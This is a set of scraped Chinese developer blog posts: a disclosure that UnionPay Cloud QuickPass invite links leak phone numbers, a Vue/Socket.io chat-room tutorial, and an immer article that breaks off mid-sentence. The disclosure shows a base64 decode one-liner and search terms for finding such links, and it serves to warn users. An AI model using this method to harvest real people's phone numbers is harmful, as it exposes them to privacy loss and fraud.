[{"title":"注意！银联云闪付活动邀请链接会泄露你的手机号码！","avatar":"https://user-gold-cdn.xitu.io/2017/12/15/160584314593c258?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"膜法小编","create_time":"2018 年 02 月 07 日","tags":["安全"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p>你的手机号泄露，意味着：你的微信，QQ 等和手机号绑定的一些服务，都有可能泄露...</p>\n</blockquote>\n<h2 class=\"heading\" data-id=\"heading-0\">00x0 缘起</h2>\n<p>最近银联在推一个活动，登录云闪付APP参与新春红包活动，对，就是下图这个活动。\n</p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f04d8336ebc9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"719\" src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f04d8336ebc9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>我们来看看第三个活动的规则：</p>\n<p></p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f0c2241580cd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"1078\" src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f0c2241580cd?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<p>真刺激啊，别人领了红包我还能再抽一次奖！那还不赶紧薅一波。</p>\n<p></p><figure><img class=\"lazyload inited loaded\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f0ded90192d3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"225\" data-height=\"225\" src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f0ded90192d3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-1\">微博大V出动了</h3>\n<p>是的，每当有这些活动的时候，就有微博大V出来薅了，毕竟占据了流量端。</p>\n<p>情景是这样的：\n</p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f1a7c02d9c00?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1190\" data-height=\"500\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1190&quot; height=&quot;500&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure>\n这样的：\n<figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f18911fbd41f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1182\" data-height=\"732\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1182&quot; height=&quot;732&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f1b6cc3b130a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"198\" data-height=\"195\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;198&quot; height=&quot;195&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-2\">00x1 发现漏洞</h2>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f1fcbb59ed8a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"498\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;498&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>是的，邀请链接里面包含了用户号码，这么愚蠢的安全问题都不注意。</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f305bc61fc7f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"114\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;114&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-3\">00x2 怎么还原</h2>\n<h3 class=\"heading\" data-id=\"heading-4\">网页端工具还原</h3>\n<p>链接戳这里：<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Ftool.oschina.net%2Fencrypt%3Ftype%3D3\" rel=\"nofollow noopener noreferrer\">在线加密解密</a></p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f22ee06b32dc?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"326\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;326&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h3 class=\"heading\" data-id=\"heading-5\">使用浏览器 DevTools 还原</h3>\n<pre><code class=\"hljs bash\" lang=\"bash\">atob(decodeURIComponent(<span class=\"hljs-string\">'就是那一小撮加密'</span>))\n</code></pre><p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f27bec298238?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"246\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;246&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<h2 class=\"heading\" data-id=\"heading-6\">00x3 后续</h2>\n<p>你可试试在微博上搜索：<code>银联云闪付</code>,<code>云闪付</code>等关键词</p>\n<p>当然百度不能少，试试在百度上搜索：<code>springFestival/invite</code></p>\n<h3 class=\"heading\" data-id=\"heading-7\">三人成团活动</h3>\n<p>之前的三人成团活动也是泄露手机号的....</p>\n<p></p><figure><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2018/2/7/1616f2da92747c3e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1280\" data-height=\"166\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1280&quot; height=&quot;166&quot;&gt;&lt;/svg&gt;\"><figcaption></figcaption></figure><p></p>\n<p>目前银联那边并没有任何反应...</p>\n<h2 class=\"heading\" data-id=\"heading-8\">00x4 参考</h2>\n<ul>\n<li>感谢 <a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fwww.v2ex.com%2Fmember%2FDOLLOR\" rel=\"nofollow noopener noreferrer\">DOLLOR</a></li>\n</ul>\n</div>"},{"title":"Vue全家桶+Socket.io+Koa2打造一个智能聊天室 接口已开放","avatar":"https://dn-mhke0kuv.qbox.me/c933cf504e2bd06b874d.jpg?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"microzz","create_time":"2017 年 05 月 10 日","tags":["Vue.js","JavaScript","Express","Vuex","WebSocket","koa"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h1 id=\"vue-js-socket-io-koa2-\" data-id=\"heading-0\">Vue.js+Socket.io+Koa2打造一个智能聊天室</h1>\n<p>Vue.js全家桶+Socket.io+Express/Koa2 打造的一个智能聊天室。<br>已经开源啦！为了方便大家学习，智能机器人、IP定位接口也开放了！接口请在源码中查看😄</p>\n<blockquote>\n<p>&nbsp;&nbsp;&nbsp;QQ群里面的智能机器人很火，于是用Vue.js+Socket.io+Koa2打造了一个智能聊天室，实现了IP定位、在线群聊，加入了Emoji表情😄，以及接入了智能机器人😏</p>\n</blockquote>\n<h2 id=\"-\" data-id=\"heading-1\">前言</h2>\n<p>话说最近前端技术圈也有派系之争了，是好事还是坏事？萝卜青菜各有所爱，本项目采用的是Vue.js做前端页面展示，大家完全可以换成自己别的喜欢的，React、Angular等等，每个框架都有可取的地方，这里不多说😂下面扯到正题上👇</p>\n<h2 id=\"-\" data-id=\"heading-2\">预览</h2>\n<p>在线预览地址：👉 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fmicrozz.com%2Fvue-chat%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">microzz.com/vue-chat/</a></p>\n<p></p><figure><img atr=\"Vue.js+Socket.io 智能聊天室 microzz.com\" class=\"lazyload inited\" data-src=\"https://dn-mhke0kuv.qbox.me/24330ba3e01436df1eb8.png?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Vue.js+Socket.io 智能聊天室 microzz.com</figcaption></figure><p></p>\n<p></p><figure><img atr=\"Vue.js+Socket.io 智能聊天室 microzz.com\" class=\"lazyload inited\" data-src=\"https://dn-mhke0kuv.qbox.me/a5abbff92a442fa2d356.png?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"600\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;600&quot;&gt;&lt;/svg&gt;\"><figcaption>Vue.js+Socket.io 智能聊天室 microzz.com</figcaption></figure><p></p>\n<h2 id=\"-\" data-id=\"heading-3\">源代码</h2>\n<p> 现在已经开源： 👉<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fmicrozz%2Fvue-chat\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/microzz/vue…</a><br> 欢迎star和提出宝贵意见😄</p>\n<h2 id=\"-\" data-id=\"heading-4\">技术栈</h2>\n<ul>\n<li><strong>Vue2.0</strong>：前端页面展示。</li>\n<li><strong>Socket.io</strong>：实现实时通信</li>\n<li><strong>Vuex</strong>：Vuex，实现不同组件间的状态共享</li>\n<li><strong>vue-router</strong>：页面路由切换</li>\n<li><strong>axios</strong>：一个基于 <code>Promise</code> 的 HTTP 库，向后端发起请求。</li>\n<li><strong>Express</strong>、<strong>Koa2</strong>：因为vue-cli生成的项目是基于<strong>express</strong>的，所以在开发阶段我使用的是它，但是真正上线生产环境我换成了<strong>Koa2</strong>。</li>\n<li><strong>Moment.js</strong>：一个时间处理的库，方便对时间进行格式化成需要的格式。</li>\n<li><strong>ES6</strong>、<strong>ES7</strong>：采用ES6语法，这是以后的趋势。箭头函数、Promise等等语法很好用。</li>\n<li><strong>localStorage</strong>：保存用户信息以及聊天记录。</li>\n<li><strong>Webpack</strong>：vue-cli自带Webpack，但是需要自己改造一下，比如要对需要安装sass相关loader，vue-cli已经配置好了webpack，你只需要安装依赖就可以，使用的时候只需要<code>&lt;style lang=\"scss\"&gt;&lt;/style&gt;</code>。</li>\n<li><strong>SASS</strong>(<strong>SCSS</strong>)：用SCSS做CSS预处理语言，有些地方很方便，个人很喜欢用。(详看👉<a href=\"https://link.juejin.im?target=https%3A%2F%2Fmicrozz.com%2F2017%2F03%2F18%2Fsass%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">SASS用法指南</a>)</li>\n<li><strong>flex</strong>：flex弹性布局，<strong>简单</strong>适配手机、PC端。</li>\n<li><strong>CSS3</strong>：CSS3过渡动画及样式。</li>\n</ul>\n<h2 id=\"-\" data-id=\"heading-5\">分析</h2>\n<h3 id=\"socket-io\" data-id=\"heading-6\">Socket.io</h3>\n<p>通过Express/Koa在服务端可以这样做:</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// Server (app.js)</span>\n\n<span class=\"hljs-keyword\">var</span> app = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'express'</span>)();\n<span class=\"hljs-keyword\">var</span> server = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>).Server(app);\n<span class=\"hljs-keyword\">var</span> io = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'socket.io'</span>)(server);\n\nserver.listen(<span class=\"hljs-number\">80</span>);\n\napp.get(<span class=\"hljs-string\">'/'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">req, res</span>) </span>{\n  res.sendfile(__dirname + <span class=\"hljs-string\">'/index.html'</span>);\n});\n\nio.on(<span class=\"hljs-string\">'connection'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">socket</span>) </span>{\n  socket.emit(<span class=\"hljs-string\">'news'</span>, { <span class=\"hljs-attr\">hello</span>: <span class=\"hljs-string\">'world'</span> });\n  socket.on(<span class=\"hljs-string\">'my other event'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{\n    <span class=\"hljs-built_in\">console</span>.log(data);\n  });\n});</code></pre><p>客户端代码</p>\n<pre><code class=\"hljs javascript\"><span class=\"hljs-comment\">// Client (index.html)</span>\n\n&lt;script src=<span class=\"hljs-string\">\"/socket.io/socket.io.js\"</span>&gt;<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span>\n&lt;script&gt;\n  <span class=\"hljs-keyword\">var</span> socket = io.connect(<span class=\"hljs-string\">'http://localhost'</span>);\n  socket.on(<span class=\"hljs-string\">'news'</span>, <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{\n    <span class=\"hljs-built_in\">console</span>.log(data);\n    socket.emit(<span class=\"hljs-string\">'my other event'</span>, { <span class=\"hljs-attr\">my</span>: <span class=\"hljs-string\">'data'</span> });\n  });\n<span class=\"xml\"><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></span></code></pre><p>不管是服务器还是客户端都有 <code>emit</code> 和 <code>on</code> 这两个函数，可以说 socket.io 的核心就是这两个函数了，通过 <code>emit</code> 和 <code>on</code> 可以轻松地实现服务器与客户端之间的双向通信。</p>\n<p><code>emit</code> ：用来发射一个事件或者说触发一个事件，第一个参数为事件名，第二个参数为要发送的数据，第三个参数为回调函数（一般省略，如需对方接受到信息后立即得到确认时，则需要用到回调函数）。<br><code>on</code> ：用来监听一个 emit 发射的事件，第一个参数为要监听的事件名，第二个参数为一个匿名函数用来接收对方发来的数据，该匿名函数的第一个参数为接收的数据，若有第二个参数，则为要返回的函数。<br>socket.io 提供了三种默认的事件（客户端和服务器都有）：<code>connect</code> 、<code>message</code> 、<code>disconnect</code> 。当与对方建立连接后自动触发 <code>connect</code> 事件，当收到对方发来的数据后触发 <code>message</code> 事件（通常为 <code>socket.send()</code> 触发），当对方关闭连接后触发 <code>disconnect</code> 事件。</p>\n<p>此外，socket.io 还支持自定义事件，毕竟以上三种事件应用范围有限，正是通过这些自定义的事件才实现了丰富多彩的通信。</p>\n<p>最后，需要注意的是，在服务器端区分以下三种情况：</p>\n<p><code>socket.emit()</code> ：向建立该连接的客户端广播<br><code>socket.broadcast.emit()</code> ：向除去建立该连接的客户端的所有客户端广播<br><code>io.sockets.emit()</code> ：向所有客户端广播，等同于上面两个的和</p>\n<p>目前聊天室指向的是我的域名，可以参与聊天室的聊天，大家也可以在index.html文件中更改。</p>\n<h2 id=\"vue-js\" data-id=\"heading-7\">Vue.js</h2>\n<p>在Vue的方面就比较常规了，Vue全家桶：Vue2.0+Vuex+axios+vue-router,我GitHub的有几个开源项目可以参考👉<a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fmicrozz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/microzz</a></p>\n<h2 id=\"-\" data-id=\"heading-8\">总结</h2>\n<ol>\n<li><p>组件状态多了用Vuex管理很方便，引用 Redux 的作者 Dan Abramov 的话说就是：</p>\n<blockquote>\n<p>Flux 架构就像眼镜：您自会知道什么时候需要它。</p>\n</blockquote>\n</li>\n<li><p>事先一定要先想好整个页面组成，怎样去分组件开发，这样在开发阶段会事半功倍。</p>\n</li>\n<li>Moment.js在Vue中用ES6的方式引入会有问题，可以尝试在main.js尝试这样<code>import moment from 'moment'</code> <code>Vue.prototype.moment = moment;</code>给Vue的原型上添加moment，这样就可以在Vue的实例中随意使用它了。</li>\n<li>get方式通过URL传参最好使用<code>encodeURI</code>对参数进行编码</li>\n<li>一定要处理好那些异步操作，否则会带来各种问题。开发阶段使用的是<code>Promise</code>，上线时候使用了ES7的<code>Async</code>+<code>Promise</code>的组合，让异步操作更加合理。</li>\n</ol>\n<h2 id=\"about\" data-id=\"heading-9\">About</h2>\n<p>关于我：👉<a href=\"https://link.juejin.im?target=https%3A%2F%2Fmicrozz.com%2Fabout%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">microzz.com/about/</a><br>GitHub：👉 <a href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fmicrozz\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">github.com/microzz</a><br>E-mail: 👉 <a href=\"https://link.juejin.im?target=mailto%3Azhaohui%40microzz.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">zhaohui@microzz.com</a></p>\n</div>"},{"title":"下一代状态管理工具 immer 简介及源码解析","avatar":"http://wx.qlogo.cn/mmopen/vi_32/KibvgwBjrsVMdzTcvBG5lAiaa1e4YY6x7s0GibFmkXHzm5PAPEI3nJ0TIEFfjmFntCu4XR1BrHFHTiaqzwUib1xSUfQ/132","author":"loatheb","create_time":"2018 年 02 月 01 日","tags":["React.js","JavaScript","Redux"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p>博客链接：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fzhangzhao.name%2F2018%2F02%2F01%2Fimmer%2520-%2520immutable%2F\" rel=\"nofollow noopener noreferrer\">下一代状态管理工具 immer 简介及源码解析</a></p>\n</blockquote>\n<p>JS 里面的变量类型可以大致分为基本类型和引用类型。在使用过程中，引用类型经常会产生一些无法意识到的副作用，所以在现代 JS 开发过程中，大家都有意识的写下断开引用的不可变数据类型。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 引用带来的副作用</span>\n<span class=\"hljs-keyword\">var</span> a = [{ <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">1</span> }]\n<span class=\"hljs-keyword\">var</span> b = a.map(<span class=\"hljs-function\"><span class=\"hljs-params\">item</span> =&gt;</span> item.val = <span class=\"hljs-number\">2</span>)\n\n<span class=\"hljs-comment\">// 期望：b 的每一个元素的 val 值变为 2</span>\n<span class=\"hljs-built_in\">console</span>.log(a[<span class=\"hljs-number\">0</span>].val) <span class=\"hljs-comment\">// 2</span>\n</code></pre>\n<div class=\"tip\">\n  从上述例子我们可以发现，本意是只想让 b 中的每一个元素的值变为 2 ，但却无意中改掉了 a 中每一个元素的结果，这是不符合预期的。接下来如果某个地方使用到了 a ，很容易发生一些我们难以预料并且难以 debug 的 bug。\n</div>\n<p>在有了这样的问题之后，一般来说当需要传递一个对象进一个函数时，我们可以使用 <code>Object.assign</code> 或者 <code>...</code> 对对象进行解构，成功断掉一层的引用。</p>\n<p>例如上面的问题我们可以改用下面的这种写法：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">var</span> a = [{ <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">1</span> }]\n<span class=\"hljs-keyword\">var</span> b = a.map(<span class=\"hljs-function\"><span class=\"hljs-params\">item</span> =&gt;</span> ({ ...item, <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">2</span> }))\n\n<span class=\"hljs-built_in\">console</span>.log(a[<span class=\"hljs-number\">0</span>].val) <span class=\"hljs-comment\">// 1</span>\n<span class=\"hljs-built_in\">console</span>.log(b[<span class=\"hljs-number\">0</span>].val) <span class=\"hljs-comment\">// 2</span>\n</code></pre><p>这样做其实还会有一个问题，无论是 <code>Object.assign</code> 还是 <code>...</code> 的解构操作，断掉的引用也只是一层，如果对象嵌套超过一层，这样做还是有一定的风险。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">var</span> a = [\n  { <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">1</span>, <span class=\"hljs-attr\">desc</span>: { <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">'a'</span> } }\n]\n<span class=\"hljs-keyword\">var</span> b = a.map(<span class=\"hljs-function\"><span class=\"hljs-params\">item</span> =&gt;</span> ({ ...item, <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">2</span> }))\n\n<span class=\"hljs-built_in\">console</span>.log(a === b)           <span class=\"hljs-comment\">// false</span>\n<span class=\"hljs-built_in\">console</span>.log(a.desc === b.desc) <span class=\"hljs-comment\">// true</span>\n</code></pre><p>这样一来，后面的代码如果一不小心在一个函数内部给 <code>b.desc</code> 对象里面的内容通过“点”进行赋值，就一定会改变具有相同引用的 <code>a.desc</code> 部分的值，这当然是不符合我们的预期的。</p>\n<p>所以在这之后，大多数情况下我们会考虑 <strong>深拷贝</strong> 这样的操作来完全避免上面遇到的所有问题。深拷贝，顾名思义就是在遍历过程中，如果遇到了可能出现引用的数据类型，就会递归的完全创建一个新的类型。</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-comment\">// 一个简单的深拷贝函数，去掉了一些胶水部分</span>\n<span class=\"hljs-comment\">// 用户态输入一定是一个 Plain Object，并且所有 value 也是 Plain Object</span>\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">deepClone</span>(<span class=\"hljs-params\">a</span>) </span>{\n  <span class=\"hljs-keyword\">const</span> keys = <span class=\"hljs-built_in\">Object</span>.keys(a)\n  <span class=\"hljs-keyword\">return</span> keys.reduce(<span class=\"hljs-function\">(<span class=\"hljs-params\">memo, current</span>) =&gt;</span> {\n    <span class=\"hljs-keyword\">const</span> value = a[current]\n    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-keyword\">typeof</span> value === <span class=\"hljs-string\">'object'</span>) {\n      <span class=\"hljs-keyword\">return</span> {\n        ...memo,\n        [current]: deepClone(value),\n      }\n    }\n    <span class=\"hljs-keyword\">return</span> {\n      ...memo,\n      [current]: value,\n    }\n  }, {})\n}\n</code></pre><p>用上面的 deepClone 函数进行简单测试</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">var</span> a = {\n  <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">1</span>,\n  <span class=\"hljs-attr\">desc</span>: {\n    <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">'a'</span>,\n  },\n}\n<span class=\"hljs-keyword\">var</span> b = deepClone(a)\n\nb.val = <span class=\"hljs-number\">2</span>\n<span class=\"hljs-built_in\">console</span>.log(a.val) <span class=\"hljs-comment\">// 1</span>\n<span class=\"hljs-built_in\">console</span>.log(b.val) <span class=\"hljs-comment\">// 2</span>\n\nb.desc.text = <span class=\"hljs-string\">'b'</span>\n<span class=\"hljs-built_in\">console</span>.log(a.desc.text) <span class=\"hljs-comment\">// 'a'</span>\n<span class=\"hljs-built_in\">console</span>.log(b.desc.text) <span class=\"hljs-comment\">// 'b'</span>\n</code></pre><p>上面的这个 <code>deepClone</code> 可以满足简单的需求，但是真正在生产工作中，我们需要考虑非常多的因素。举例来说：</p>\n<ul>\n<li>key 里面 getter，setter 以及原型链上的内容如何处理</li>\n<li>value 是一个 Symbol 如何处理</li>\n<li>value 是其他非 Plain Object 如何处理</li>\n<li>value 内部出现了一些循环引用如何处理</li>\n</ul>\n<p>因为有太多不确定因素，所以我还是推荐使用大型开源项目里面的工具函数，比较常用的为大家所熟知的就是 <code>lodash.cloneDeep</code>，无论是安全性还是效果都有所保障。</p>\n<p>其实，这样的概念我们常称作 immutable ，意为不可变的数据，其实理解为不可变关系更为恰当。每当我们创建一个被 <code>deepClone</code> 过的数据，新的数据进行有副作用 (side effect) 的操作都不会影响到之前的数据，这也就是 immutable 的精髓和本质。</p>\n<p>然而 deepClone 这种函数虽然断绝了引用关系实现了 immutable，但是开销实在太大。所以在 2014 年，facebook 的 immutable-js 横空出世，即保证了 immutable ，又兼顾了性能。</p>\n<h2 class=\"heading\" data-id=\"heading-0\">immutable-js 简介</h2>\n<p>immutable-js 使用了另一套数据结构的 API ，与我们的常见操作有些许不同，它将所有的原生对象都会转化成 immutable-js 的内部对象，并且任何操作最终都会返回一个新的 immutable 的值。</p>\n<p>上面的例子使用 immutable-js 就需要这样改造一下：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> { fromJS } = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'immutable'</span>)\n<span class=\"hljs-keyword\">const</span> data = {\n  <span class=\"hljs-attr\">val</span>: <span class=\"hljs-number\">1</span>,\n  <span class=\"hljs-attr\">desc</span>: {\n    <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">'a'</span>,\n  },\n}\n\n<span class=\"hljs-keyword\">const</span> a = fromJS(data)\n\n<span class=\"hljs-keyword\">const</span> b = a.set(<span class=\"hljs-string\">'val'</span>, <span class=\"hljs-number\">2</span>)\n<span class=\"hljs-built_in\">console</span>.log(a.get(<span class=\"hljs-string\">'val'</span>)) <span class=\"hljs-comment\">// 1</span>\n<span class=\"hljs-built_in\">console</span>.log(b.get(<span class=\"hljs-string\">'val'</span>)) <span class=\"hljs-comment\">// 2</span>\n\n<span class=\"hljs-keyword\">const</span> pathToText = [<span class=\"hljs-string\">'desc'</span>, <span class=\"hljs-string\">'text'</span>]\n<span class=\"hljs-keyword\">const</span> c = a.setIn([...pathToText], <span class=\"hljs-string\">'c'</span>)\n<span class=\"hljs-built_in\">console</span>.log(a.getIn([...pathToText])) <span class=\"hljs-comment\">// 'a'</span>\n<span class=\"hljs-built_in\">console</span>.log(c.getIn([...pathToText])) <span class=\"hljs-comment\">// 'c'</span>\n</code></pre><p>对于性能方面，immutable-js 也有它的优势，举个简单的例子：</p>\n<pre><code class=\"hljs js\" lang=\"js\"><span class=\"hljs-keyword\">const</span> { fromJS } = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'immutable'</span>)\n<span class=\"hljs-keyword\">const</span> data = {\n  <span class=\"hljs-attr\">content</span>: {\n    <span class=\"hljs-attr\">time</span>: <span class=\"hljs-string\">'2018-02-01'</span>,\n    <span class=\"hljs-attr\">val</span>: <span class=\"hljs-string\">'Hello World'</span>,\n  },\n  <span class=\"hljs-attr\">desc</span>: {\n    <span class=\"hljs-attr\">text</span>: <span class=\"hljs-string\">'a'</span>,\n  },\n}\n\n<span class=\"hljs-keyword\">const</span> a = fromJS(data)\n<span class=\"hljs-keyword\">const</span> b = a.setIn([<span class=\"hljs-string\">'desc'</span>, <span class=\"hljs-string\">'text'</span>], <span class=\"hljs-string\">'b'</span>)\n<span class=\"hljs-built_in\">console</span>.log(b.get(<span class=\"hljs-string\">'desc'</span>) === a.get(<span class=\"hljs-string\">'desc'</span>))       <span class=\"hljs-comment\">// false</span>\n<span class=\"hljs-built_in\">console</span>.log(b.get(<span class=\"hljs-string\">'content'</span>) === a.get(<span class=\"hljs-string\">'content'</span>)) <span class=\"hljs-comment\">// true</span>\n\n<span class=\"hljs-keyword\">const</span> c = a.toJS()\n<span class=\"hljs-keyword\">const</span> d = b.toJS()\n<span class=\"hljs-built_in\">console</span>.log(c.desc === d.desc)       <span class=\"hljs-comment\">// false</span>\n<span class=\"hljs-built_in\">console</span>.log(c.content === d.content) <span class=\"hljs-comment\">// false</span>\n</code></pre><p>从上面的例子可以看出来，在 immutable-js 的数据结构中，深层次的对象在没有修改的情况下仍然能够保证严格相等。这里的严格相等就可以认为是没有新建这个对象，仍然在内部保持着之前的引用，但是修改却不会同步的修改。</p>\n<p>经常使用 React 的同学肯定也对 immutable-js 不陌生，这也就是为什么 immutable-js 会极大提高 React 页面性能的原因之一了。</p>\n<p>当然能够达到 immutable 效果的当然不只这几个个例，这篇文章我主要想介绍实现 immutable 的库其实是 immer。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">immer 简介</h2>\n<p>immer 的作者同时也是 mobx 的作者，一个看起来非常感性的中年大叔。mobx 又像是把 Vue 的一套东西融合进了 React，已经在社区取得了不错的反响。immer 则是他在 immutable 方面所做的另一个实践，在 2018-02-01，immer 成功发布了 